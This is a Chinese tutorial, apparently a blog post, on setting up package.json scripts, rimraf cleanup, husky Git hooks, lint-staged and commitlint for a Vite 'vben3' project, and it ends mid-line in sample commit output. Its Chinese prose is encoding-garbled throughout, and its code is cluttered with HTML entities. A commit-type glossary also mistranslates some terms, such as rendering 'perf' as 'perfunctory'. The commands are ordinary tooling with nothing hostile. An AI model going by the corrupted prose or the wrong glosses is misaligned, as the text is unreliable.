ä»£ç¢¼ï¼š\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;serve\u0026#34;: \u0026#34;npx --max_old_space_size=4096 vite\u0026#34;, // ... } ä½œç”¨ï¼šä»¥é–‹ç™¼ç’°å¢ƒé‹è¡Œé …ç›®ï¼Œä¸¦è¨­ç½®nodeçš„é‹è¡Œå…§å­˜ç‚º4Gã€‚\n--max-old-space-sizeï¼šå–®ä½ç‚ºMB --max-new-space-sizeï¼šå–®ä½ç‚ºKB nodeå‘½ä»¤è¡Œæ–‡æª” npxçš„Gité¦–é ï¼Œæœ‰å‘½ä»¤è¡Œèªªæ˜ \u0026ndash;max-old-space-sizeå‚æ•°è¯´æ˜ dev ä»£ç¢¼ï¼š\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;dev\u0026#34;: \u0026#34;npx --max_old_space_size=4096 vite\u0026#34;, // ... } ä½œç”¨ï¼šåŒserveã€‚\nbuild ä»£ç¢¼ï¼š\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;build\u0026#34;: \u0026#34;vite build\u0026#34;, // ... } ä½œç”¨ï¼šé€™è£¡å…ˆä¸ç®¡ã€‚å…ˆä½¿ç”¨åŸä¾†å‰µå»ºé …ç›®çš„\u0026quot;build\u0026quot;: \u0026quot;vite build\u0026quot;ã€‚å¾Œé¢å®Œæˆäº†viteé…ç½®ä¹‹å¾Œå†è™•ç†é€™å€‹è…³æœ¬ã€‚\nbuild:no-cache ä»£ç¢¼ï¼š\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;build:no-cache\u0026#34;: \u0026#34;yarn clean:cache \u0026amp;\u0026amp; npm run build\u0026#34;, // ... } ä½œç”¨ï¼šæ¸…ç©ºç·©å­˜å¾Œæ§‹å»ºã€‚\nreport ä½œç”¨ï¼šç”Ÿæˆæ‰“åŒ…åˆ†æï¼Œé€™è£¡å…ˆä¸ç®¡ï¼Œç­‰å¾Œé¢é…ç½®viteå†èªªã€‚\npreview ä»£ç¢¼ï¼š\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;preview\u0026#34;: \u0026#34;npm run build \u0026amp;\u0026amp; vite preview\u0026#34;, // ... } ä½œç”¨ï¼šå…ˆæ‰“åŒ…åœ¨é€²è¡Œé è¦½ï¼Œä½¿ç”¨viteè¨ªå•distç›®éŒ„ã€‚\npreview:dist ä»£ç¢¼ï¼š\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;preview:dist\u0026#34;: \u0026#34;vite preview\u0026#34;, // ... } ä½œç”¨ï¼šç›´æ¥é è¦½æœ¬åœ° dist æ–‡ä»¶ç›®éŒ„ã€‚\nlog è©³æƒ…æŸ¥é–±ï¼šä½¿ç”¨conventional-changelog-cliç”Ÿæˆè®Šæ›´è¨˜éŒ„\nä½œç”¨ï¼šç”¨ä¾†ç”Ÿç”¢Gitæäº¤è¨˜éŒ„çš„ã€‚\nclean:cache ä½œç”¨ï¼šåˆªé™¤ç·©å­˜ï¼Œåˆªé™¤node_modules/.cache/å’Œnode_modules/.viteä¸‹çš„æ–‡ä»¶ï¼Œç”±æ–¼åˆªé™¤å‘½ä»¤ä¾è³´é‚„æ²’å®‰è£ï¼Œæ‰€ä»¥å¾Œé¢å†è¬›ã€‚\nclean:lib ä½œç”¨ï¼šæ¸…é™¤ä¾è³´ï¼Œåˆªé™¤node_modulesæ–‡ä»¶å¤¾ï¼Œç”±æ–¼åˆªé™¤å‘½ä»¤ä¾è³´é‚„æ²’å®‰è£ï¼Œæ‰€ä»¥å¾Œé¢å†è¬›ã€‚\nlint:eslint ä»£ç¢¼ï¼š\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;lint:eslint\u0026#34;: \u0026#34;eslint \\\u0026#34;{src,mock}/**/*.{vue,ts,tsx}\\\u0026#34; --fix\u0026#34;, // ... } ä½œç”¨ï¼šåŸ·è¡Œ eslint æ ¡é©—ï¼Œè©²å‘½ä»¤æœƒå°é …ç›®çš„srcã€mockç›®éŒ„ä¸‹çš„vueã€tsã€tsxæ–‡ä»¶é€²è¡Œ eslint æ ¡é©—ï¼Œä¸¦ä¿®å¾©éƒ¨åˆ†å•é¡Œã€‚\nåƒè€ƒé€£çµï¼šeslintå‘½ä»¤è¡Œèªªæ˜\nlint:prettier ä»£ç¢¼ï¼š\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;lint:prettier\u0026#34;: \u0026#34;prettier --write --loglevel warn \\\u0026#34;src/**/*.{js,json,tsx,css,less,scss,vue,html,md}\\\u0026#34;\u0026#34;, // ... } ä½œç”¨ï¼šåŸ·è¡Œ prettier æ ¼å¼åŒ–ä»£ç¢¼ã€‚è©²å‘½ä»¤æœƒå°é …ç›®æ‰€æœ‰ä»£ç¢¼ é€²è¡Œ prettier æ ¼å¼åŒ–ã€‚è¬¹æ…åŸ·è¡Œã€‚\nå¦‚æœä½ çš„vsCodeå®‰è£äº†prettieræ’ä»¶ã€‚é‚£éº¼prettieræ’ä»¶å°±æœƒè®€å–æ ¹ç›®éŒ„ä¸‹çš„prettier.config.jsæ–‡ä»¶ã€‚ç•¶ä½ ä¿å­˜çš„æ™‚å€™å°±æœƒé€²è¡Œæ ¼å¼åŒ–æ–‡ä»¶ã€‚\nä½†æ˜¯éæ˜¯åˆ¥äººæäº¤ä¸Šä¾†çš„æ–‡ä»¶ï¼Œä½ é‚„å»é»é–‹å®ƒçš„æ–‡ä»¶ä¸€å€‹ä¸€å€‹ä¿å­˜éº¼ï¼Ÿæ‰€ä»¥åŸ·è¡Œé€™å€‹å‘½ä»¤ï¼Œå¯ä»¥å°‡srcç›®éŒ„ä¸‹ï¼Œæ‰€æœ‰çš„æ–‡ä»¶æ ¼å¼åŒ–ã€‚\nåƒè€ƒé€£çµï¼šprettierå‘½ä»¤è¡Œèªªæ˜\nlint:stylelint ä»£ç¢¼ï¼š\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;lint:stylelint\u0026#34;: \u0026#34;stylelint --fix \\\u0026#34;**/*.{vue,less,postcss,css,scss}\\\u0026#34; --cache --cache-location node_modules/.cache/stylelint/\u0026#34;, // ... } ä½œç”¨ï¼šæ ¡é©—æ‰€æœ‰æ–‡ä»¶çš„æ¨£å¼æ ¼å¼ï¼Œä¸¦å˜—è©¦ä¿®å¾©ã€‚\nåƒè€ƒé€£çµï¼šstylelintå‘½ä»¤è¡Œè¯´æ˜\nlint:ls-lint ä»£ç¢¼ï¼š\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;lint:ls-lint\u0026#34;: \u0026#34;ls-lint\u0026#34;, // ... } ä½œç”¨ï¼šæ ¡é©—æ‰€æœ‰æ–‡ä»¶å‘½åæ˜¯å¦æ­£ç¢ºã€‚\nlint:lint-staged éœ€å…ˆå‰µå»ºlint-stagedçš„é…ç½®æ–‡ä»¶\nä»£ç¢¼ï¼š\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;lint:lint-staged\u0026#34;: \u0026#34;lint-staged -c ./.husky/lintstagedrc.js\u0026#34;, // ... } ä½œç”¨ï¼šå°Gitæš«å­˜çš„æ–‡ä»¶é€²è¡Œlintæª¢æŸ¥ã€‚\nlint:pretty éœ€å…ˆå‰µå»ºlint-stagedçš„é…ç½®æ–‡ä»¶\nä»£ç¢¼ï¼š\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;lint:pretty\u0026#34;: \u0026#34;pretty-quick --staged\u0026#34;, // ... } ä½œç”¨ï¼šå°Gitæš«å­˜æ–‡ä»¶é€²è¡Œprettyçš„æ“ä½œã€‚\ntest:gzip ä½œç”¨ï¼šé€™å€‹å¾Œé¢å†èªªï¼Œhttp-serverçš„npmé¦–é ã€‚\ntest:br ä½œç”¨ï¼šé€™å€‹å¾Œé¢å†èªªï¼Œhttp-serverçš„npmé¦–é ã€‚\nreinstall ä½œç”¨ï¼šé‡æ–°å®‰è£ä¾è³´ï¼Œè©²å‘½ä»¤æœƒå…ˆåˆªé™¤ node_modulesã€yarn.lockã€package.lock.jsonå¾Œåœ¨é€²è¡Œä¾è³´é‡æ–°å®‰è£ï¼Œé€Ÿåº¦æœƒæ˜é¡¯è®Šæ…¢ã€‚\nç”±æ–¼åˆªé™¤å‘½ä»¤ä¾è³´é‚„æ²’å®‰è£ï¼Œæ‰€ä»¥å¾Œé¢å†è¬›ã€‚\ninstall:husky ä»£ç¢¼ï¼š\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;install:husky\u0026#34;: \u0026#34;is-ci || husky install\u0026#34;, // ... } ä½œç”¨ï¼šé€™å€‹æ˜¯ç”¨ä¾†åˆå§‹åŒ–huskyçš„ã€‚å•Ÿç”¨Gitæ›é‰¤ã€‚\nèªªæ˜ï¼šå¦‚æœä¸æ˜¯CIæœå‹™å™¨ï¼Œå°±å•Ÿå‹•Gité‰¤å­ã€‚\ngen:icon ä½œç”¨ï¼šç”Ÿæˆåœ–æ¨™çš„ï¼Œå¾Œé¢å†èªªã€‚\npostinstall éœ€å…ˆé…ç½® husky\nä»£ç¢¼ï¼š\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;postinstall\u0026#34;: \u0026#34;npm run install:husky\u0026#34;, // ... } ä½œç”¨ï¼šåŸ·è¡Œinstall:huskyå‘½ä»¤ã€‚é€™å€‹å‘½ä»¤æœƒè‡ªå‹•å•Ÿå‹•Gité‰¤å­ï¼Œè©²æ“ä½œåƒè€ƒï¼šæ‰‹å‹•åˆå§‹åŒ–huskyå’ŒYarn2ä¸‹æ€éº¼è‡ªå‹•å•Ÿå‹•Gité‰¤å­å‡½æ•¸ã€‚\nå½™ç¸½ package.jsoné™¤è…³æœ¬ã€é‹è¡Œä¾è³´ã€é–‹ç™¼ä¾è³´å¤–çš„å­—æ®µåƒè€ƒå®˜æ–¹æ–‡æª”ã€‚\nyarn -vçš„è…³æœ¬æ˜¯å¾Œé¢è¦èªªçš„è…³æœ¬ã€‚\npackage.json 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 { // ... \u0026#34;scripts\u0026#34;: { \u0026#34;bootstrap\u0026#34;: \u0026#34;yarn install\u0026#34;, \u0026#34;serve\u0026#34;: \u0026#34;npx --max_old_space_size=4096 vite\u0026#34;, \u0026#34;dev\u0026#34;: \u0026#34;npx --max_old_space_size=4096 vite\u0026#34;, \u0026#34;build\u0026#34;: \u0026#34;vite build\u0026#34;, \u0026#34;build:no-cache\u0026#34;: \u0026#34;yarn clean:cache \u0026amp;\u0026amp; npm run build\u0026#34;, \u0026#34;report\u0026#34;: \u0026#34;yarn -v\u0026#34;, \u0026#34;preview\u0026#34;: \u0026#34;npm run build \u0026amp;\u0026amp; vite preview\u0026#34;, \u0026#34;preview:dist\u0026#34;: \u0026#34;vite preview\u0026#34;, \u0026#34;log\u0026#34;: \u0026#34;yarn -v\u0026#34;, \u0026#34;clean:cache\u0026#34;: \u0026#34;yarn -v\u0026#34;, \u0026#34;clean:lib\u0026#34;: \u0026#34;yarn -v\u0026#34;, \u0026#34;lint:eslint\u0026#34;: \u0026#34;eslint \\\u0026#34;{src,mock}/**/*.{vue,ts,tsx}\\\u0026#34; --fix\u0026#34;, \u0026#34;lint:prettier\u0026#34;: \u0026#34;prettier --write --loglevel warn \\\u0026#34;src/**/*.{js,json,tsx,css,less,scss,vue,html,md}\\\u0026#34;\u0026#34;, \u0026#34;lint:stylelint\u0026#34;: \u0026#34;stylelint --fix \\\u0026#34;**/*.{vue,less,postcss,css,scss}\\\u0026#34; --cache --cache-location node_modules/.cache/stylelint/\u0026#34;, \u0026#34;lint:ls-lint\u0026#34;: \u0026#34;ls-lint\u0026#34;, \u0026#34;lint:lint-staged\u0026#34;: \u0026#34;lint-staged -c ./.husky/lintstagedrc.js\u0026#34;, \u0026#34;lint:pretty\u0026#34;: \u0026#34;pretty-quick --staged\u0026#34;, \u0026#34;test:gzip\u0026#34;: \u0026#34;yarn -v\u0026#34;, \u0026#34;test:br\u0026#34;: \u0026#34;yarn -v\u0026#34;, \u0026#34;reinstall\u0026#34;: \u0026#34;yarn -v\u0026#34;, \u0026#34;install:husky\u0026#34;: \u0026#34;is-ci || husky install\u0026#34;, \u0026#34;gen:icon\u0026#34;: \u0026#34;yarn -v\u0026#34;, \u0026#34;postinstall\u0026#34;: \u0026#34;npm run install:husky\u0026#34; }, // ... } å®‰è£rimraf èªªæ˜ ç”±æ–¼æ‰‹å‹•åˆªé™¤æ–‡ä»¶å¤¾å¤ªæ…¢äº†ï¼Œéœ€è¦å¯¦ç¾è…³æœ¬åˆªé™¤æ–‡ä»¶ã€‚\nåƒè€ƒé€£çµ rimrafçš„npmé¦–é \nrimrafçš„npmé¦–é èªªæ˜ï¼š\nThe UNIX command rm -rf for node.\nInstall with npm install rimraf, or just drop rimraf.js somewhere.\nç¿»è­¯ï¼š\nnodeç‰ˆçš„Unixç³»çµ±å‘½ä»¤rm -rfã€‚\nç”¨npmå®‰è£rimrafï¼Œæˆ–è€…ç›´æ¥æŠŠrimraf.jsæ”¾åœ¨æŸå€‹åœ°æ–¹ã€‚\né›–ç„¶é€™è£¡å¯ä»¥é€šéimportä½¿ç”¨å‡½æ•¸åˆªé™¤æ–‡ä»¶ï¼Œä½†æ˜¯æˆ‘å€‘ä¸»è¦æ˜¯ä½¿ç”¨å®ƒçš„å‘½ä»¤è¡Œè›¤ã€‚\nè©³æƒ…æŸ¥çœ‹ï¼šrimrafçš„npmé¦–é -Cilèªªæ˜ã€‚\nå®‰è£ 1 yarn add rimraf --dev é‡å¯«è…³æœ¬ å°±æ˜¯æ ¹ç›®éŒ„ä¸‹package.jsonçš„scriptså­—æ®µã€‚\nclean:cache package.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;clean:cache\u0026#34;: \u0026#34;rimraf node_modules/.cache/ \u0026amp;\u0026amp; rimraf node_modules/.vite\u0026#34;, // ... } ç›®çš„ï¼šåˆªé™¤ç·©å­˜ï¼Œåˆªé™¤node_modules/.cache/å’Œnode_modules/.viteä¸‹çš„æ–‡ä»¶ã€‚ clean:lib package.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;clean:lib\u0026#34;: \u0026#34;rimraf node_modules\u0026#34;, // ... } ç›®çš„ï¼šæ¸…é™¤ä¾è³´ï¼Œåˆªé™¤node_modulesæ–‡ä»¶å¤¾ã€‚ reinstall package.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;reinstall\u0026#34;: \u0026#34;rimraf yarn.lock \u0026amp;\u0026amp; rimraf package.lock.json \u0026amp;\u0026amp; rimraf node_modules \u0026amp;\u0026amp; npm run bootstrap\u0026#34;, // ... } ç›®çš„ï¼šé‡æ–°å®‰è£ä¾è³´ï¼Œè©²å‘½ä»¤æœƒå…ˆåˆªé™¤ node_modulesã€yarn.lockã€package.lock.jsonå¾Œåœ¨é€²è¡Œä¾è³´é‡æ–°å®‰è£ï¼Œé€Ÿåº¦æœƒæ˜é¡¯è®Šæ…¢ã€‚ ä½¿ç”¨huskyè¦èŒƒä»£ç¢¼æäº¤ èªªæ˜ ä½¿ç”¨Gitæäº¤ä»£ç¢¼çš„æ™‚å€™ï¼Œéœ€è¦å°æš«å­˜çš„ä»£ç¢¼é€²è¡Œå¦‚ä¸‹æ“ä½œï¼š\né€²è¡Œlintæ“ä½œã€‚ å°commitçš„æ¶ˆæ¯é€²è¡Œæ ¼å¼åŒ–æª¢æŸ¥ã€‚ é€²è¡Œprettieræ“ä½œã€‚ éœ€è¦å®‰è£çš„ä¾è³´æœ‰ï¼šhuskyã€lint-stagedã€@commitlint/cliã€@commitlint/config-conventionalã€pretty-quickã€is-ciã€‚\nhuskyï¼šå¯ä»¥åœ¨Gitçš„é‰¤å­å‡½æ•¸ä¸­åŸ·è¡Œè…³æœ¬ã€‚ lint-stagedï¼šé‡å°æš«å­˜æ–‡ä»¶é€²è¡Œlintæ“ä½œã€‚ @commitlint/cliï¼šå°commitçš„æ¶ˆæ¯é€²è¡Œæ ¼å¼æª¢æŸ¥ã€‚ @commitlint/config-conventionalï¼šcommitçš„æ¶ˆæ¯æª¢æŸ¥æ ¼å¼å‚³çµ±é…ç½®ï¼Œå°æ‡‰é‚„æœ‰å¾ˆå¤šå…¶ä»–é…ç½®ï¼Œæ¯”å¦‚angularçš„æäº¤è¦ç¯„@commitlint/config-angularã€‚ pretty-quickï¼šé‡å°æš«å­˜æ–‡ä»¶é€²è¡Œprettieræ“ä½œã€‚ is-ciï¼šhuskyå¥½åƒä¸èƒ½åœ¨ciç’°å¢ƒä¸‹åŸ·è¡Œï¼Œé€™å€‹ä¾è³´æ˜¯ç”¨ä¾†åˆ¤æ–·æ˜¯ä¸æ˜¯ciç’°å¢ƒçš„ã€‚ åƒè€ƒé€£çµ huskyçš„npmé¦–é  huskyå®˜æ–¹æ–‡æª” lint-stagedçš„npmé¦–é  @commitlint/cliçš„npmé¦–é  @commitlint/cilå®˜ç¶² @commitlint/config-conventionalçš„é¦–é  pretty-quickçš„npmé¦–é  Prettierå®˜ç¶²å°Gité‰¤å­å‡½æ•¸çš„æ”¯æŒèªªæ˜ is-ciçš„npmé¦–é  å‰ç«¯ä»£ç¢¼è¦ç¯„å¾0åˆ°1 å‰ç«¯å·¥ä½œæµ å®‰è£ 1 yarn add husky lint-staged @commitlint/cli @commitlint/config-conventional pretty-quick is-ci --dev é…ç½®commitlint commitlintå®˜æ–¹é…ç½®èªªæ˜ commitlinté…ç½®è¦å‰‡ åœ¨æ ¹ç›®éŒ„ä¸‹å‰µå»ºcommitlint.config.jsæ–‡ä»¶ã€‚\ncommitlint.config.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 module.exports = { // â†“ å¿½ç•¥åŒ…å«initçš„æäº¤æ¶ˆæ¯ ignores: [(commit) =\u0026gt; commit.includes(\u0026#39;init\u0026#39;)], // â†“ æŒ‰ç…§ä¼ ç»Ÿæ¶ˆæ¯æ ¼å¼æ¥éªŒè¯ extends: [\u0026#39;@commitlint/config-conventional\u0026#39;], // â†“ è¿™é‡Œæ˜¯è‡ªå®šä¹‰è§£æå™¨ï¼Œçœ‹ä¸å¤ªæ‡‚ï¼Œç›´æ¥æ¬ä»£ç å§ // â†“ https://commitlint.js.org/#/reference-configuration?id=parser-presets parserPreset: { parserOpts: { headerPattern: /^(\\w*|[\\u4e00-\\u9fa5]*)(?:[\\(\\ï¼ˆ](.*)[\\)\\ï¼‰])?[\\:\\ï¼š] (.*)/, headerCorrespondence: [\u0026#39;type\u0026#39;, \u0026#39;scope\u0026#39;, \u0026#39;subject\u0026#39;], referenceActions: [ \u0026#39;close\u0026#39;, \u0026#39;closes\u0026#39;, \u0026#39;closed\u0026#39;, \u0026#39;fix\u0026#39;, \u0026#39;fixes\u0026#39;, \u0026#39;fixed\u0026#39;, \u0026#39;resolve\u0026#39;, \u0026#39;resolves\u0026#39;, \u0026#39;resolved\u0026#39; ], issuePrefixes: [\u0026#39;#\u0026#39;], noteKeywords: [\u0026#39;BREAKING CHANGE\u0026#39;, \u0026#39;ä¸å…¼å®¹å˜æ›´\u0026#39;], fieldPattern: /^-(.*?)-$/, revertPattern: /^Revert\\s\u0026#34;([\\s\\S]*)\u0026#34;\\s*This reverts commit (\\w*)\\./, revertCorrespondence: [\u0026#39;header\u0026#39;, \u0026#39;hash\u0026#39;], warn() {}, mergePattern: null, mergeCorrespondence: null } }, // â†“ è‡ªå®šä¹‰æäº¤æ¶ˆæ¯è§„åˆ™ rules: { // â†“ bodyä»¥ç©ºç™½è¡Œå¼€å¤´ \u0026#39;body-leading-blank\u0026#39;: [2, \u0026#39;always\u0026#39;], // â†“ footerä»¥ç©ºç™½è¡Œå¼€å¤´ \u0026#39;footer-leading-blank\u0026#39;: [1, \u0026#39;always\u0026#39;], // â†“ headerçš„æœ€å¤§é•¿åº¦ \u0026#39;header-max-length\u0026#39;: [2, \u0026#39;always\u0026#39;, 108], // â†“ subjectä¸ºç©º \u0026#39;subject-empty\u0026#39;: [2, \u0026#39;never\u0026#39;], // â†“ typeä¸ºç©º \u0026#39;type-empty\u0026#39;: [2, \u0026#39;never\u0026#39;], // â†“ typeçš„ç±»å‹ \u0026#39;type-enum\u0026#39;: [ 2, \u0026#39;always\u0026#39;, [ \u0026#39;feat\u0026#39;, \u0026#39;fix\u0026#39;, \u0026#39;perf\u0026#39;, \u0026#39;style\u0026#39;, \u0026#39;docs\u0026#39;, \u0026#39;test\u0026#39;, \u0026#39;refactor\u0026#39;, \u0026#39;build\u0026#39;, \u0026#39;ci\u0026#39;, \u0026#39;chore\u0026#39;, \u0026#39;revert\u0026#39;, \u0026#39;wip\u0026#39;, \u0026#39;workflow\u0026#39;, \u0026#39;types\u0026#39; ] ] } }; é…ç½®husky å•Ÿå‹•Gité‰¤å­ 1 npx husky install é€™å€‹æ™‚å€™å°±åœ¨æ ¹ç›®éŒ„ä¸‹å‰µå»ºäº†.huskyç›®éŒ„äº†ã€‚ vbenå°‡è£¡é¢çš„ä¸€å€‹æ–‡ä»¶å¤¾åˆªé™¤äº†ã€‚\nä¿®å¾©YarnOnWindowsBug å®˜æ–¹åƒè€ƒé€£çµ\nåœ¨å¸¶æœ‰Git Bashï¼ˆstdin is not a ttyï¼‰çš„Windowsä¸Šä½¿ç”¨Yarnæ™‚ï¼ŒGitæ›é‰¤å¯èƒ½æœƒå¤±æ•—ã€‚å¦‚æœæ‚¨æœ‰Windowsç”¨æˆ¶ï¼Œå‰‡å¼·çƒˆå»ºè­°æ·»åŠ ä»¥ä¸‹è§£æ±ºæ–¹æ³•ã€‚\nå‰µå»º.husky/common.shï¼š 1 2 3 4 5 6 7 8 command_exists () { command -v \u0026#34;$1\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 } # Workaround for Windows 10, Git Bash and Yarn if command_exists winpty \u0026amp;\u0026amp; test -t 1; then exec \u0026lt; /dev/tty fi åœ¨ä½¿ç”¨Yarné‹è¡Œå‘½ä»¤çš„åœ°æ–¹å°‡å…¶ä¾†æºï¼š 1 2 3 4 5 #!/bin/sh . \u0026#34;$(dirname \u0026#34;$0\u0026#34;)/_/husky.sh\u0026#34; . \u0026#34;$(dirname \u0026#34;$0\u0026#34;)/common.sh\u0026#34; yarn ... é€™è£¡æ˜¯yarnå‘½ä»¤çš„åœ°æ–¹è¦é€™æ¨£ç”¨ï¼Œå…¶ä»–åœ°æ–¹è¦ä¸è¦ç„¡æ‰€è¬‚ã€‚ç¬¬äºŒæ­¥å¯ä»¥å…ˆä¸ç®¡ã€‚\nå‰µå»ºlint-stagedçš„é…ç½®æ–‡ä»¶ lint:lint-staged package.json 1 2 3 \u0026#34;scripts\u0026#34;: { \u0026#34;lint:lint-staged\u0026#34;: \u0026#34;lint-staged -c ./.husky/lintstagedrc.js\u0026#34; } ä½œç”¨ï¼šå°Gitæš«å­˜çš„æ–‡ä»¶é€²è¡Œlintæª¢æŸ¥ã€‚\nlint:pretty package.json 1 2 3 \u0026#34;scripts\u0026#34;: { \u0026#34;lint:pretty\u0026#34;: \u0026#34;pretty-quick --staged\u0026#34; } ä½œç”¨ï¼šå°Gitæš«å­˜æ–‡ä»¶é€²è¡Œprettyçš„æ“ä½œã€‚\ninstall:husky package.json 1 2 3 \u0026#34;scripts\u0026#34;: { \u0026#34;install:husky\u0026#34;: \u0026#34;is-ci || husky install\u0026#34; } ä½œç”¨ï¼šå¦‚æœä¸æ˜¯CIæœå‹™å™¨ï¼Œå°±å•Ÿå‹•Gité‰¤å­ã€‚\npostinstall package.json 1 2 3 \u0026#34;scripts\u0026#34;: { \u0026#34;postinstall\u0026#34;: \u0026#34;npm run install:husky\u0026#34; } ä½œç”¨ï¼šåŸ·è¡Œinstall:huskyå‘½ä»¤ã€‚é€™å€‹å‘½ä»¤æœƒè‡ªå‹•å•Ÿå‹•Gité‰¤å­ï¼Œåƒè€ƒæ–‡æª”ã€‚\nçµ¦huskyæ·»åŠ ä»»å‹™ npxçš„Gité¦–é ï¼Œæœ‰å‘½ä»¤è¡Œèªªæ˜ commitlintçš„å‘½ä»¤è¡Œèªªæ˜ 1 2 3 4 5 6 7 8 9 10 # å•Ÿå‹•husky yarn install:husky # æ·»åŠ commitæ¶ˆæ¯æª¢æŸ¥ä»»å‹™åˆ°`.husky/commit-msg`æ–‡ä»¶ä¸­ # é€™è£¡æˆ‘ä¸€ç›´åŸ·è¡Œä¸å‡ºä¾†ï¼Œæ˜¯å¼•è™Ÿå¼•å…¶çš„å•é¡Œï¼Œå¤§å®¶å¯ä»¥å…ˆå‰µå»ºç©ºçš„ç„¶å¾ŒæŠŠå‘½ä»¤è¤‡è£½é€²å» # npx husky add .husky/commit-msg \u0026#39;npx --no-install commitlint --edit \u0026#34;$1\u0026#34;\u0026#39; npx husky add .husky/commit-msg # å‰µå»ºä¸€å€‹ä»»å‹™æ–‡ä»¶ npx husky add .husky/pre-commit æ‰‹å‹•ä¿®æ”¹.husky/commit-msgæ–‡ä»¶ï¼š\né€™è£¡é¢çš„$1ä¸€å®šè¦ç”¨é›™å¼•è™Ÿï¼Œä¸ç„¶å¾Œé¢åŸ·è¡Œæœƒå ±éŒ¯ã€‚\n.husky/commit-msg 1 2 3 4 #!/bin/sh . \u0026#34;$(dirname \u0026#34;$0\u0026#34;)/_/husky.sh\u0026#34; npx --no-install commitlint --edit \u0026#34;$1\u0026#34; æ‰‹å‹•ä¿®æ”¹.husky/pre-commitæ–‡ä»¶ï¼š\nåƒè€ƒé€£çµï¼š\nåœ¨CIä¸­ç¦ç”¨é‰¤å­ åœ¨Windowsä¸Šçš„Yarn æœ€å¾Œæ‰‹å‹•åŸ·è¡Œä¹‹å‰å‰µå»ºçš„è…³æœ¬å‘½ä»¤ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 #!/bin/sh . \u0026#34;$(dirname \u0026#34;$0\u0026#34;)/_/husky.sh\u0026#34; . \u0026#34;$(dirname \u0026#34;$0\u0026#34;)/common.sh\u0026#34; [ -n \u0026#34;$CI\u0026#34; ] \u0026amp;\u0026amp; exit 0 # Check the file name # ! ls-lint cannot be used normally in mac pro of M1 system. npm run lint:ls-lint # Format and submit code according to lintstagedrc.js configuration npm run lint:lint-staged npm run lint:pretty æ¸¬è©¦ å¤±æ•—æ¸¬è©¦ æœ€å¥½å…ˆé‡å•Ÿä½ çš„ide\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 git add . git commit -m \u0026#34;éš¨ä¾¿æ‰“ä¸€äº›æ¶ˆæ¯\u0026#34; \u0026gt; vben3@0.0.0 lint:ls-lint F:\\CodeLearn\\vben\\vben3 \u0026gt; ls-lint \u0026gt; vben3@0.0.0 lint:lint-staged F:\\CodeLearn\\vben\\vben3 \u0026gt; lint-staged -c ./.husky/lintstagedrc.js [STARTED] Preparing... # ä¸€ç³»åˆ—æª¢æŸ¥... [SUCCESS] Cleaning up... \u0026gt; vben3@0.0.0 lint:pretty F:\\CodeLearn\\vben\\vben3 \u0026gt; pretty-quick --staged ï¿½ğŸ” Finding changed files since git revision 1346762. ï¿½ğŸ¯ Found 2 changed files. âœ… Everything is awesome! â§— input: éš¨ä¾¿æ‰“ä¸€äº›æ¶ˆæ¯ âœ– subject may not be empty [subject-empty] âœ– type may not be empty [type-empty] âœ– found 2 problems, 0 warnings â“˜ Get help: https://github.com/conventional-changelog/commitlint/#what-is-commitlint husky - commit-msg hook exited with code 1 (error) æ ¼å¼ å‡ºéŒ¯äº†ï¼Œæˆ‘å€‘è¦ç¯„çš„æäº¤æ¶ˆæ¯è©¦è©¦ï¼š\n@commitlint/config-conventionalçš„è¦ç¯„+æˆ‘å€‘è‡ªå®šç¾©çš„è¦å‰‡ã€‚\ntype: some message\né¡å‹è‹±æ–‡ é¡å‹ä¸­æ–‡ build å»ºç«‹ chore é›œäº‹ ci ci docs æ–‡æª” feat å£¯èˆ‰ fix ä¿®å¾© perf æ•·è¡ refactor é‡æ§‹ revert æ¢å¾© style æ¨£å¼ test æ¸¬è©¦ æˆåŠŸæ¸¬è©¦ æäº¤æˆåŠŸï¼Œç•¶ç„¶ä½ ä¸ç”¨æ“”å¿ƒé€™æ¨£æ‰‹æ•²å¤ªéº»ç…©äº†ï¼Œå¾Œé¢é‚„æœ‰æ’ä»¶å¯ä»¥è‡ªå‹•å¹«ä½ æ•²é€™äº›æ ¼å¼ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 git commit -m \u0026#34;feat: æˆ‘å€‘æˆåŠŸçš„è¦ç¯„äº†Gitæäº¤!\u0026#34; \u0026gt; vben3@0.0.0 lint:pretty F:\\CodeLearn\\vben\\vben3 \u0026gt; pretty-quick --staged ï¿½ğŸ” Finding changed files since git revision 1346762. ï¿½ğŸ¯ Found 2 changed files. âœ… Everything is awesome! [master 6c61fc5] feat: æˆ‘å€‘æˆåŠŸçš„è¦ç¯„äº†Gitæäº¤! 7 files changed, 104 insertions(+), 4 deletions(-) create mode 100644 .husky/.gitignore create mode 